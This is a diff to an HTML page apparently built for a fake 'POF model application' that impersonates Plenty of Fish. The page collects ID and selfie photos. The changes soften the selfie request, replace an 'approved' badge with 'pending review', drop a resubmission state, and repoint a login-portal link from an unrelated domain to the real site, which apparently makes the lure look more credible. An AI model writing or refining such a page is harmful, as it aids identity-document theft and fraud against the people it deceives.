@@ -301,17 +301,12 @@
       </div>
 
       <!-- Selfie -->
-      <div class="selfie-note">
-        <span class="note-icon">💡</span>
-        <span>Hold your ID next to your face and take a clear photo. Both your face and the ID text must be fully visible and in focus.</span>
-      </div>
-
-      <p class="upload-label">Selfie with ID <span style="color:var(--brand)">*</span></p>
+      <p class="upload-label">Selfie <span style="color:var(--brand)">*</span></p>
       <label class="upload-zone" id="selfieZone">
         <input type="file" accept="image/*" capture="user" id="selfieFile" onchange="fileSelected('selfie', this)" />
         <div class="uz-icon">🤳</div>
-        <div class="uz-label">Click to upload selfie holding your ID</div>
-        <div class="uz-sub">JPG or PNG &middot; Front camera recommended</div>
+        <div class="uz-label">Take a clear selfie showing your face</div>
+        <div class="uz-sub">Good lighting &middot; Face fully visible &middot; JPG or PNG</div>
         <div class="uz-file" id="selfieFileName"></div>
       </label>
 
@@ -352,33 +347,14 @@
           </div>
           <h2>You're in the pond! &#128031;</h2>
           <p class="desc">
-            Welcome, <strong id="success-name"></strong>! Your POF model application has been approved and your profile is now active on Plenty of Fish.
+            Welcome, <strong id="success-name"></strong>! Your POF model application has been submitted and is under review by our team.
           </p>
-          <div class="status-badge" style="background:var(--success-bg);border-color:var(--success-border);color:#065f46">
-            &#10003;&nbsp; Identity Verified &amp; Approved
+          <div class="status-badge" style="background:#fefce8;border-color:#fde68a;color:#92400e">
+            &#9203;&nbsp; Pending Review &mdash; 24&ndash;48 hrs
           </div>
           <p class="success-email-note">
             A confirmation will be sent to<br>
             <strong id="success-email"></strong>.
-          </p>
-        </div>
-
-        <!-- ── Re-submitted (after re-verify) ── -->
-        <div id="state-resubmitted" style="display:none">
-          <div class="check-anim">
-            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-          </div>
-          <h2>You're in the pond! &#128031;</h2>
-          <p class="desc">
-            Welcome, <strong id="resubmit-name"></strong>! Your POF model application has been re-submitted and is under review by our team.
-          </p>
-          <div class="status-badge">
-            <div class="pulse-dot"></div>
-            Pending Review &mdash; 24–48 hrs
-          </div>
-          <p class="success-email-note">
-            A confirmation will be sent to<br>
-            <strong id="resubmit-email"></strong> once your identity is verified.
           </p>
         </div>
 
@@ -389,7 +365,7 @@
           <p class="desc">
             We were unable to verify your identity at this time. Please log in with the credentials below and re-submit your verification documents.
           </p>
-          <a href="https://modelsampletest.com/login.html" target="_blank" rel="noopener" class="btn-login-portal">
+          <a href="https://www.pof.com/login/" target="_blank" rel="noopener" class="btn-login-portal">
             Go to Login Portal &rarr;
           </a>
           <p class="reverify-note">Once you've completed re-verification on the portal, click below to notify us:</p>
